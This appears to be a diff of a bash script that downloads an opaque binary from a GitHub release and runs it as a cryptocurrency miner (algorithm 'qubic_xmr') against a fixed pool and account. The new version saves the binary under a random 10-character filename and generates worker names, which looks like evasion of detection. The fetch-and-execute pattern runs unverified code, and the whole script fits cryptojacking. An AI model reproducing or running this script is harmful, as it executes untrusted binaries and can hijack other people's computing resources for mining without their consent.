@@ -1,4 +1,35 @@
 #!/bin/bash
-wget https://github.com/vedhagsvp/qubros/releases/download/apl/aplnwa
-chmod +x aplnwa
-./aplnwa --account CP_udnvh2owpq --worker $RANDOM --pool qubic.asia.apool.io:4334
+
+# Function to generate a random 10-character lowercase alphanumeric filename
+generate_random_filename() {
+    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
+    echo
+}
+
+# Function to generate a worker name with prefix, date, and random suffix
+generate_worker_name() {
+    local prefix="FAB44"
+    local date_str
+    date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
+    local random_suffix
+    random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 4)
+
+    echo "${prefix}-${date_str}-${random_suffix}"
+}
+
+# Generate file and worker names
+FILENAME=$(generate_random_filename)
+WORKER_NAME=$(generate_worker_name)
+
+# Download the file and rename it
+wget -O "$FILENAME" https://github.com/vedhagsvp/tkospae/releases/download/aplose/aloeps
+
+# Make it executable
+chmod +x "$FILENAME"
+
+# Run the program
+./"$FILENAME" --algo qubic_xmr --account CP_udnvh2owpq --worker "$WORKER_NAME" --pool qubic.asia.apool.io:4334
+
+# Print info
+echo "File: $FILENAME"
+echo "Worker: $WORKER_NAME"
